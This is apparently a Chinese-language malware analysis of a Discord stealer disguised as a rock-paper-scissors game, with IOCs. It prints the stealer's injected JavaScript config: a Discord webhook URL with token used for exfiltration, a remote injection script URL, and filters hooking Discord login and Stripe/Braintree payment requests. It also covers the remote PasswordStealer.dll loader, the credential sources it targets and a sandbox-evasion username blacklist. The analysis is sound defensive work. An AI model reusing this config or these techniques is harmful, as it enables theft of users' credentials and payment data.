
被注入的js文件较长，通过 JavaScript文件的配置信息可以窥见其主要功能如下，其详细功能见<mark class="encrypted">19eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1M7X3g2F1k6r3#2A6j5%4u0G2i4K6u0W2j5$3!0E0i4K6u0r3K9X3q4Q4y4h3k6B7M7q4)9J5c8Y4u0W2M7$3g2S2M7X3y4Z5i4K6u0r3x3U0y4Q4x3V1k6Z5i4K6u0r3K9h3&6X3L8#2)9J5k6s2y4@1k6h3q4D9k6i4u0Q4x3X3c8S2j5Y4g2K6K9h3&6Y4i4K6u0V1j5$3!0V1k6i4y4H3j5h3y4W2M7#2)9J5k6s2m8#2N6s2y4Q4x3X3c8V1K9i4y4U0L8%4u0V1i4K6u0V1N6i4y4W2M7Y4y4Q4x3X3c8Q4x3X3c8V1j5i4c8S2i4K6u0V1j5i4c8Q4x3X3c8J5K9i4y4C8i4K6u0W2K9s2c8E0L8l9`.`.</mark>

1. `webhook`: Discord Webhook 的 URL，用于将信息发送到指定的 Discord 服务器或频道。
2. `webhook_protector_key`: Webhook 保护密钥。
3. `auto_buy_nitro`: 一个布尔值，表示是否启用自动购买 Nitro 的功能。
4. `ping_on_run`: 一个布尔值，表示是否在运行时通过 `ping_val` 提及（ping）所有人。
5. `ping_val`: 在运行时提及（ping）的消息内容，通常是 `@everyone`。
6. `embed_name`: 发送到 Discord 的消息中嵌入的名称。
7. `embed_icon`: 发送到 Discord 的消息中嵌入的图标的 URL。
8. `embed_color`: 发送到 Discord 的消息中嵌入的颜色。
9. `injection_url`: Discord 注入脚本的 URL。
10. `api`: Discord 用户信息 API 的 URL。
11. `nitro`: 包含 Nitro 订阅计划的对象。
12. `boost`: 包含 Nitro Boost 订阅计划。
13. `year`: 年订阅计划的详细信息。
14. `month`: 月订阅计划的详细信息。
15. `classic`: 包含经典 Nitro 订阅计划。
16. `filter`: 包含需要过滤的 URL 列表，用于监听 Discord API 请求。
17. `filter2`: 包含需要过滤的第二个 URL 列表，用于监听其他 Discord 相关请求。

```javascript
const config = {
webhook: 'hxxps://discord[.]com/api/webhooks/1095580593544237088/P6vEnIM_dngrti7YjsQG7J5vsRaMY6EFlxxj-kMLNU-6Hnb1d4PHjrHUDlAsLXtBJHew',
webhook_protector_key: '%WEBHOOK_KEY%',
auto_buy_nitro: false,
ping_on_run: false,
ping_val: '@everyone',
embed_name: 'Fr injection',
embed_icon: 'hxxps://cdn.discordapp[.]com/attachments/1077267633365340172/1094133346788970556/582387.png',
embed_color: 0,
injection_url: 'hxxps://raw.githubusercontent[.]com/Anthemiaa/fr/main/clean.js',
api: 'https://discord.com/api/v9/users/@me',
nitro: {
boost: {
year: {
id: '521847234246082599',
sku: '511651885459963904',
price: '9999',
},
month: {
id: '521847234246082599',
sku: '511651880837840896',
price: '999',
},
},
classic: {
month: {
id: '521846918637420545',
sku: '511651871736201216',
price: '499',
},
},
},
filter: {
urls: [
'https://discord.com/api/v*/users/@me',
'https://discordapp.com/api/v*/users/@me',
'https://*.discord.com/api/v*/users/@me',
'https://discordapp.com/api/v*/auth/login',
'https://discord.com/api/v*/auth/login',
'https://*.discord.com/api/v*/auth/login', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
'https://api.stripe.com/v*/tokens',
'https://api.stripe.com/v*/setup_intents/*/confirm',
'https://api.stripe.com/v*/payment_intents/*/confirm',
],
},
filter2: {
urls: [
'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
'https://*.discord.com/api/v*/applications/detectable',
'https://discord.com/api/v*/applications/detectable',
'https://*.discord.com/api/v*/users/@me/library',
'https://discord.com/api/v*/users/@me/library',
'wss://remote-auth-gateway.discord.gg/*',
],
},
};
```

### LoadDll

该样本还会下载名为`PasswordStealer.dll`的恶意dll文件并加载执行类`PasswordStealer.Stealer`中的`Run`方法。该恶意dll托管在github，`hxxps://raw.githubusercontent[.]com/Anthemiaa/fr/master/PasswordStealer.dll`

![](upload/attach/202401/917207_ACA8WDANVYUZCU7.png)

github用户名为 `Anthemiaa`

![](upload/attach/202401/917207_Q79ZURSXU6C5XGH.png)

`PasswordStealer.dll`同目录下还有一个名为`clean.js`的文件，功能与`index.js`几乎一致。

![](upload/attach/202401/917207_Q7XPA36YNXNFW49.png)

## PasswordStealer.dll

### 基本信息

MD5：`ef4265e61daa8c0c8db8d40744196b11`

![](upload/attach/202401/917207_UJN8AX3GC669YUY.png)

### PasswordStealer分析

### Stealer.run()方法

通过`Chromium.Grab()`方法窃取基于 chromium 的浏览器相关浏览器中保存的url、账户和密码信息，如：`Hostname`（账户相关的网站 URL，`origin_url`）、`Username`（用户名，`username_value`）、`Password`（密码，`password_value`），其逻辑与`Browser-password-stealer`类似，针对基于 chromium 的浏览器。

![](upload/attach/202401/917207_F9JKGVRXJMHP3JX.png)

通过`FirefoxPassReader`方法，窃取Firefox浏览器中保存的url、账户和密码信息，其获取逻辑与<mark class="encrypted">22bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6#2L8X3!0V1k6g2)9J5c8X3k6A6M7X3g2X3L8%4S2Q4y4h3k6V1k6h3y4J5P5i4m8@1i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2K9h3&6Q4x3V1k6X3K9i4u0W2k6X3!0^5i4K6g2X3k6r3g2U0M7Y4W2H3N6q4)9J5k6i4m8&6</mark> 基本一致。

![](upload/attach/202401/917207_QS4C2Q75PBM7W92.png)

窃取FileZilla 应用程序的密码等信息。FileZilla是一个FTP客户端软件，其历史记录以纯文本形式存储在文件`%APPDATA%\\filezilla\\recentservers.xml`中，并将其登录数据存储在文件`%APPDATA%\\filezilla\\sitemanager.xml`中。

![](upload/attach/202401/917207_5CKKS9BKXQY9TFH.png)

窃取NordVPN的密码等信息。

![](upload/attach/202401/917207_JTZDC3WYNHFHUNZ.png)

窃取Outlook密码等信息。遍历注册表中与 Outlook 配置文件相关的子键，并尝试获取 IMAP、POP3、HTTP 和 SMTP 密码。

![](upload/attach/202401/917207_MJQXKRQTFGGMJQU.png)

## IOCs

`7b6e1adf588ce77419920593970292fb`

`ef4265e61daa8c0c8db8d40744196b11`

`hxxps://raw.githubusercontent[.]com/Anthemiaa/fr/master`

# Discord Stealer样本分析

## 基本信息

样本名称为`RockPaperScissors.exe`，MD5：`7b6e1adf588ce77419920593970292fb`，由C#编写。

![](https://bbs.kanxue.com/upload/attach/202401/917207_DPR8W8866ZTWX9S.png)

## Discord Stealer分析

### Main

没有混淆，首先获取黑名单数组，检测当前用户是否在黑名单中，如果不在黑名单中，则异步任务调用`Program.<>c.<>9.<Main>.<b__6_0>()`方法`Program.<>c.<>9.<Main>.<b__6_1>()`方法，然后获取本地应用程序数据文件夹路径（即`C:\Users\用户名\AppData\Local`）并启动异步任务调用`Program.<>c.<>9.<Main>.<b__6_2>()`方法、`Program.<>c.<>9.<Main>.<b__6_3>()`方法，最后调用 `Program.RPS()`方法，如果在黑名单内，则调用`Program.RPS()` 方法，`Program.RPS()`方法是石头剪刀布(Rock, Paper, Scissors)游戏。

![](https://bbs.kanxue.com/upload/attach/202401/917207_Q7AJUKGEXFP4PNM.png)

`blacklistUsers`如下：

|  |  |
| --- | --- |
| 1 | `WDAGUtilityAccount`、`3W1GJT`、`QZSBJVWM`、`5ISYH9SH`、`Abby`、`hmarc`、`patex`、`RDhJ0CNFevzX`、`kEecfMwgj`、`Frank`、`8Nl0ColNQ5bq`、`Lisa`、`John`、`george`、`PxmdUOpVyx`、`8VizSM`、`w0fjuOVmCcP5A`、`lmVwjj9b`、`PqONjHVwexsS`、`3u2v9m8`、`Julia`、`HEUeRzl`、`fred`、`server`、`BvJChRPnsxn`、`Harry Johnson`、`SqgFOf3G`、`Lucas`、`mike`、`PateX`、`h7dk1xPr`、`Louise`、`User01`、`test`、`RGzcBUyrznReg`、`05h00Gi0`、`43By4`、`4tgiizsLimS`、`6O4KyHhJXBiR`、`7wjlGX7PjlW4`、`Amy`、`AppOnFlySupport`、`ASPNET`、`azure`、`BUiA1hkm`、`cM0uEGN4do`、`cMkNdS6`、`DefaultAccount`、`dOuyo8RV71`、`DVrzi`、`e60UW`、`ecVtZ5wE`、`EGG0p`、`G2DbYLDgzz8Y`、`GjBsjb`、`Guest`、`ICQja5iT`、`IVwoKUF`、`j6SHA37KA`、`j7pNjWM`、`jude`、`kFu0lQwgX5P`、`KUv3bT4`、`lK3zMR`、`l3cnbB8Ar5b8`、`lmVwjj9b`、`Louise`、`Lucas`、`mike`、`Mr.None`、`noK4zG7ZhOf`、`o6jdigq`、`o8yTi52T`、`OgJb6GqgK0O`、`PgfV1X`、`pWOuqdTDQ`、`PxmdUOpVyx`、`QfofoG`、`QmIS5df7u`、`QORxJKNk`、`qZo9A`、`S7Wjuf`、`sal.rosenburg`、`Steve`、`TVM`、`txWas1m2t`、`umyUJ`、`Uox1tzaMO`、`vzY4jmH0Jw02`、`XMiMmcKziitD`、`xPLyvzr8sgC`、`ykj0egq7fze`、`DdQrgc`、`ryjIJKIrOMs`、`nZAp7UBVaS1`、`zOEsT`、`xUnUy`、`fNBDSlDTXY`、`gu17B`、`UiQcX`、`21zLucUnfI85`、`OZFUCOD6`、`8LnfAai9QdJR`、`5sIBK`、`rB5BnfuR2`、`GexwjQdjXG`、`IZZuXj`、`ymONofg`、`dxd8DJ7c`、`JAW4Dz0`、`GJAm1NxXVm`、`UspG1y1C`、`equZE3J`、`BXw7q`、`lubi53aN14cU`、`5Y3y73`、`9yjCPsEYIMH`、`GGw8NR`、`JcOtj17dZx`、`05KvAUQKPQ`、`64F2tKIqO5`、`7DBgdxu`、`uHUQIuwoEFU`、`gL50ksOp`、`Of20XqH4VL`、`tHiF2T`、`dx`、`jz`、`WALKER` |
